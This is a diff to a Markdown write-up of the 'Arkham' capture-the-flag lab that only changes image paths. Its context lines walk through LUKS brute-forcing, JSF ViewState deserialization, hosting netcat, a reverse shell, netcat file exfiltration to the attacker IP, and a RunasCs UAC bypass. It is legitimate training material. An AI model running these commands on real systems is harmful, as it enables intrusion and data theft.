@@ -68,7 +68,7 @@ Testing SMB and RPC for Guest/Null authentication shows that we have read permis
 └─$ nxc smb 10.129.228.116 -u 'Guest' -p '' --shares
 ```
 
-![](../assets/img/2026-05-17-Arkham/1.png)
+![](/assets/img/2026-05-17-Arkham/1.png)
 
 Inside is just one Zip archive for what looks to be the web application server's files and the Users share doesn't give us any good information.
 
@@ -76,7 +76,7 @@ Inside is just one Zip archive for what looks to be the web application server's
 └─$ smbclient //10.129.228.116/BatShare -U ''
 ```
 
-![](../assets/img/2026-05-17-Arkham/2.png)
+![](/assets/img/2026-05-17-Arkham/2.png)
 
 ### LUKS Encrypted File
 Unzipping the archive gives us a note from Alfred which discloses that the other file is a backup image from their Linux server. Running a file command against it shows we're dealing with a LUKS encrypted file. 
@@ -85,11 +85,11 @@ Unzipping the archive gives us a note from Alfred which discloses that the other
 └─$ unzip appserver.zip
 ```
 
-![](../assets/img/2026-05-17-Arkham/3.png)
+![](/assets/img/2026-05-17-Arkham/3.png)
 
 Attempting to use a tool like [luks2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/luks2john.py) that converts it into a crackable format fails due to an unsupported mode, so I swap to using [bruteforce-luks](https://github.com/glv2/bruteforce-luks) to decrypt this file.
 
-![](../assets/img/2026-05-17-Arkham/4.png)
+![](/assets/img/2026-05-17-Arkham/4.png)
 
 This tool can be installed with `sudo apt install bruteforce-luks` and works to decrypt LUKS files by brute-forcing them against a wordlist. It's relatively slow so I'll filter out batman related passwords from rockyou.txt to speed things up since this box has that general theme.
 
@@ -99,7 +99,7 @@ This tool can be installed with `sudo apt install bruteforce-luks` and works to 
 └─$ bruteforce-luks -f passwords.txt backup.img
 ```
 
-![](../assets/img/2026-05-17-Arkham/5.png)
+![](/assets/img/2026-05-17-Arkham/5.png)
 
 Now we can open this file using cryptsetup to prep it for mounting. This will create a new mapping to the image under our `/dev/mapper` directory. 
 
@@ -109,7 +109,7 @@ Now we can open this file using cryptsetup to prep it for mounting. This will cr
 └─$ ls -la /dev/mapper
 ```
 
-![](../assets/img/2026-05-17-Arkham/6.png)
+![](/assets/img/2026-05-17-Arkham/6.png)
 
 Now we can mount it to our filesystem and begin looking at the contents.
 
@@ -121,16 +121,16 @@ Now we can mount it to our filesystem and begin looking at the contents.
 └─$ ls -la /mnt/Arkham
 ```
 
-![](../assets/img/2026-05-17-Arkham/7.png)
+![](/assets/img/2026-05-17-Arkham/7.png)
 
 ### Web Config Files
 There is a Mask directory which holds the Tomcat site's XML files as well as a few pictures for the webpage.
 
-![](../assets/img/2026-05-17-Arkham/8.png)
+![](/assets/img/2026-05-17-Arkham/8.png)
 
 Taking a peek inside of the web.xml.bak file confirms that the web server is using MyFaces, which is an open-source implementation of the JavaServer Faces (JSF) application that is commonly shipped with Tomcat.
 
-![](../assets/img/2026-05-17-Arkham/9.png)
+![](/assets/img/2026-05-17-Arkham/9.png)
 
 One of the more common vulnerabilities in Java web applications is getting RCE via deserialization. If we take a closer look at the XML files, we can discover the `org.apache.myfaces.SECRET` parameter's value which is used to initialize the encryption and authentication keys for the application's view state. This means that if we find somewhere on the site that accepts a _ViewState_ parameter in our request, we can send a serialized payload to get RCE on the system.
 
@@ -143,20 +143,20 @@ JavaServer Faces (JSF) deserialization attacks target the framework's handling o
 
 With all that covered, I head over to the landing page on port 80 which shows the typical IIS index HTML. My scans also don't discover anything interesting.
 
-![](../assets/img/2026-05-17-Arkham/10.png)
+![](/assets/img/2026-05-17-Arkham/10.png)
 
 ### Finding Request with ViewState Parameter
 Heading over to the Tomcat server on port 8080 shows a custom site for a company offering a data protection service. 
 
-![](../assets/img/2026-05-17-Arkham/11.png)
+![](/assets/img/2026-05-17-Arkham/11.png)
 
 The site is largely static with the exception of a Subscription tab that allows us to submit an email in order to signup for a newsletter. This page has the .faces extension which is commonly used in JavaServer Faces (JSF) Web Requests.
 
-![](../assets/img/2026-05-17-Arkham/12.png)
+![](/assets/img/2026-05-17-Arkham/12.png)
 
 Capturing a request to this endpoint reveals that we are indeed sending a _ViewState_ parameter to the server. We can now move to crafting a serialized payload using the secret string from the web's XML files.
 
-![](../assets/img/2026-05-17-Arkham/13.png)
+![](/assets/img/2026-05-17-Arkham/13.png)
 
 ### Generating Payloads
 I'll first use [Ysoserial](https://github.com/frohoff/ysoserial) to generate a first malicious payload that will grab a netcat binary from my machine and then a second to execute a reverse shell command with it. To properly set this tool up, we can grab the latest .jar file from the releases page and run it with the `java -jar` command. Note that I had to use sdkman to install a Java 8 runtime in order to get it to work at all.
@@ -265,7 +265,7 @@ Standing up a Python web server to host a netcat binary works to upload it to th
 └─$ python3 -m http.server 80
 ```
 
-![](../assets/img/2026-05-17-Arkham/14.png)
+![](/assets/img/2026-05-17-Arkham/14.png)
 
 Once the binary has been uploaded, we can execute it with the second encrypted payload to get a shell on the system as Alfred.
 
@@ -273,7 +273,7 @@ Once the binary has been uploaded, we can execute it with the second encrypted p
 └─$ rlwrap -cAr nc -lnvp 443
 ```
 
-![](../assets/img/2026-05-17-Arkham/15.png)
+![](/assets/img/2026-05-17-Arkham/15.png)
 
 At this point we can grab the user flag from his Desktop folder and begin looking at ways to escalate privileges to Administrator.
 
@@ -286,7 +286,7 @@ Recursively looking for files in Alfred's home directory shows a backup.zip arch
 PS> dir -r C:\Users\Alfred
 ```
 
-![](../assets/img/2026-05-17-Arkham/16.png)
+![](/assets/img/2026-05-17-Arkham/16.png)
 
 I transfer this to my local machine using a Netcat connection and file redirectors. Make sure to execute this in a CMD shell as PowerShell will result in a ParserError.
 
@@ -300,7 +300,7 @@ PS> C:\windows\system32\spool\drivers\color\nc.exe 10.10.14.243 1234 < backup.zi
 
 This won't automatically kill the connection, but we can `CTRL + C` our listener to terminate it and get back to our normal shell. Unzipping the archive gives us a Microsoft Outlook Offline Storage file under Alfred's name.
 
-![](../assets/img/2026-05-17-Arkham/17.png)
+![](/assets/img/2026-05-17-Arkham/17.png)
 
 ### Credentials in PNG
 Instead of transferring this to my Windows VM, I'll use readpst to convert it into MBOX format for easier parsing. If that command is unavailable, we can install the **pst-utils** package to get access through the following command:
@@ -311,15 +311,15 @@ Instead of transferring this to my Windows VM, I'll use readpst to convert it in
 └─$ readpst alfred@arkham.local.ost
 ```
 
-![](../assets/img/2026-05-17-Arkham/18.png)
+![](/assets/img/2026-05-17-Arkham/18.png)
 
 There's a ton of output from this, but we can gather two main things. The first is a message telling Master Wayne to stop forgetting his password and the second is a base64-encoded PNG file.
 
-![](../assets/img/2026-05-17-Arkham/19.png)
+![](/assets/img/2026-05-17-Arkham/19.png)
 
 We can copy/paste the base64 blob into a new file and decode it to view the image. Opening it shows a screenshot of a terminal and grants us credentials for the Batman user.
 
-![](../assets/img/2026-05-17-Arkham/20.png)
+![](/assets/img/2026-05-17-Arkham/20.png)
 
 ### RunasCs and UAC Bypass
 Since there are no terminal services exposed to get a shell and Windows doesn't support swapping users in an already existing shell, I will upload [RunasCs.exe](https://github.com/antonioCoco/RunasCs) to the machine and use it to spawn a PowerShell instance whilst redirecting stdin and stdout to my local machine. This effectively creates a makeshift shell and will let us run more commands as Batman.
@@ -330,7 +330,7 @@ Attempting to run it without any extra options shows that logon for that user is
 PS> .\RunasCs.exe batman "[REDACTED]" powershell -r 10.10.14.243:445 --bypass-uac
 ```
 
-![](../assets/img/2026-05-17-Arkham/21.png)
+![](/assets/img/2026-05-17-Arkham/21.png)
 
 After standing up a netcat listener and waiting for a connection, we grab a shell as Batman. Since we bypassed the User Account Control, we obtain a privileged shell on the system.
 
@@ -338,10 +338,10 @@ After standing up a netcat listener and waiting for a connection, we grab a shel
 └─$ rlwrap -cAr nc -lvnp 445
 ```
 
-![](../assets/img/2026-05-17-Arkham/22.png)
+![](/assets/img/2026-05-17-Arkham/22.png)
 
 Batman is a local administrator, meaning we have full access over the system and can grab the root flag under the Administrator's Desktop folder to complete this challenge.
 
-![](../assets/img/2026-05-17-Arkham/23.png)
+![](/assets/img/2026-05-17-Arkham/23.png)
 
 That's all y'all, this box was great for learning about deserialization attacks and different types of cryptography. This could definitely prove to be tricky if you have no prior experience with those areas but resources like these are nice to be able to practice them. I hope this was helpful to anyone following along or stuck and happy hacking!
